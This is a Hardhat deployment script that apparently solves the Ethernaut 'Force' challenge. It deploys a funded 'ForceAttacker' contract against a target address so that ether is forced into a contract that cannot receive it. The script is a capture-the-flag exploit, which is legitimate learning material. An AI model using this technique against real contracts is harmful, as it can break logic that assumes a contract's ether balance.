import { TransactionResponse } from '@ethersproject/providers';
import { ethers } from 'hardhat';

const CONTRACT_NAME = 'Force';
const ATTACKER_NAME = 'ForceAttacker';
const CONTRACT_ADDRESS = '0x2c9b69606611589D543726e5Ad66467DA0d84b56';

export async function main() {
  let tx: TransactionResponse;

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address, {
    value: 1,
  });
  await attackerContract.deployed();
  await attackerContract.deployTransaction.wait(6);
  console.log('Attacker Contract deployed to:', attackerContract.address);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
